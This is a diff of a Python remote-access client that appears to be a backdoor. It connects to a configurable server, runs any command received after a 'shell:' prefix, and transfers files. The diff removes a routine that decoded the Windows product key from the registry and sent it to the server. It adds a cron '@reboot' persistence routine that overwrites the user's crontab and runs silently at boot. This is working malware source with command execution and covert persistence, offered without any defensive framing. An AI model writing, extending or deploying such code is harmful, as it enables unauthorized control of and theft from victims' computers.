@@ -4,44 +4,39 @@ import time
 import platform
 import subprocess
 import psutil  # To monitor network speed
-import winreg  # Still needed if you keep the get_windows_key()
+import sys
+import shutil
+
 
 SERVER_IP = "127.0.0.1"  # Update with the server's IP
 SERVER_PORT = 9999
 BUFFER_SIZE = 4096  # Size of each chunk for file transfer
 
 
-def get_windows_key():
+def add_to_startup():
     """
-    Retrieves the Windows product key using logic from the test.py file.
+    Adds the client script to startup using cron job for persistence on Linux.
     """
     try:
-        def get_key(path, name):
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
-            value, _ = winreg.QueryValueEx(key, name)
-            return value
+        script_path = os.path.abspath(__file__)
 
-        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-        digital_product_id = get_key(key_path, "DigitalProductId")
-
-        def decode_key(data):
-            key_chars = "BCDFGHJKMPQRTVWXY2346789"
-            key = []
-            for i in range(24, 0, -1):
-                current = 0
-                for j in range(14, -1, -1):
-                    current = current * 256 + data[j]
-                    data[j] = current // 24
-                    current %= 24
-                key.insert(0, key_chars[current])
-                if (i % 5 == 0) and (i != 0):
-                    key.insert(0, '-')
-            return ''.join(key)
-
-        windows_key = decode_key(list(digital_product_id)[52:67])
-        return windows_key
+        # Create a cron job that runs the script on startup
+        cron_job = f"@reboot python3 {script_path}\n"
+        cron_file = "/tmp/mycron"
+        
+        # Open crontab and add the new job
+        with open(cron_file, "w") as f:
+            f.write(cron_job)
+        
+        # Add the cron job to crontab
+        subprocess.run(f"crontab {cron_file}", shell=True)
+        
+        # Clean up
+        os.remove(cron_file)
+        
+        print("[INFO] Client added to startup successfully.")
     except Exception as e:
-        return f"Error retrieving Windows key: {e}"
+        print(f"[ERROR] Failed to add to startup: {e}")
 
 
 def get_network_speed():
@@ -104,8 +99,10 @@ def download_file(client_socket, filename):
 def main():
     """
     Main client logic to connect to the server and perform requested operations.
-    Persistence on system boot has been removed.
+    Includes reconnection and persistence mechanisms.
     """
+    add_to_startup()  # Ensure persistence on system boot
+
     while True:
         try:
             # Connect to server
@@ -126,9 +123,6 @@ def main():
                 command = client_socket.recv(1024).decode()
                 if command.lower() == "exit":
                     break
-                elif command.lower() == "get_key":
-                    key = get_windows_key()
-                    client_socket.send(f"Windows Key: {key}".encode())
                 elif command.lower().startswith("shell:"):
                     cmd = command.split("shell:")[1]
                     output = subprocess.getoutput(cmd)
@@ -141,7 +135,7 @@ def main():
                     download_file(client_socket, filename)
 
             client_socket.close()
-        except Exception:
+        except Exception as e:
             print("[ERROR] Connection lost. Reconnecting in 5 seconds...")
             time.sleep(5)  # Wait and try reconnecting
 
